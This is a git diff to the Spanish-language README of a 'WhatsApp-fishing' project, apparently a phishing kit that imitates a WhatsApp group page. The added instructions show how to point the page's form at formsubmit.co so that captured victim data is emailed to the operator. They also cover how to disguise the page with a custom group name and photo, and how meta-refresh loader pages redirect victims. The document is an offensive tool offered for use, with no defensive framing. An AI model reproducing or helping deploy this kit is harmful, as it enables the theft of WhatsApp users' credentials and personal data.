@@ -1,6 +1,8 @@
 # WhatsApp-fishing
 WhatsApp_fishing web
 
+> website para hacer fishing de WhatsApp para Android y computadoras 
+
 ## website para fishing para Whatsapp
 
 # requerimientos
@@ -16,9 +18,22 @@ WhatsApp_fishing web
 ```html
  <form action="https://formsubmit.co/username@gmail.com" method="POST">
 ```
+> previamente ya actívaste tu cuenta en 
+<body>
+<img src="https://formsubmit.co/image/logo.png">
+</body>
+
+> para que los datos te los envíen a tu correo electrónico 
 # nombre
 
-> también puedes editar el nombre del grupo como la foto de perfil :)
+> para cambiar el nombre del grupo tienes que editar la cesión en en el index.html 
+```html
+<p2>nombre del grupo </p2>
+```
+
+</details>
+> para cambiar la foto de perfil tienes que cambiar la foto ubicado en
+ /img/grupo.jpg
 
 # enlace de archivos 
 
@@ -31,7 +46,22 @@ WhatsApp_fishing web
 ```
 # recursos
 
-> puedes utilizar los load implementado en los archivos :)
+> puedes utilizar los load implementado en los archivos 
+se encuentra en /load/load.html y load2.html
+
+### función
+
+> se utiliza la etiqueta
+```html
+<meta http-equiv="refresh" content="tiempo;URL='url'">
+```
+> para redireccionar a otra web o archivos especificado
+> para usar la etiqueta se tiene que editar [tiempo] que es el tiempo en que se demora para redireccionar la usuaria [url] que web se carga
+
+
+> load es un intermediario para hacer la página mas dinámica y para que se carga correctamente
+
+### función 
 >
 # fotos 
 
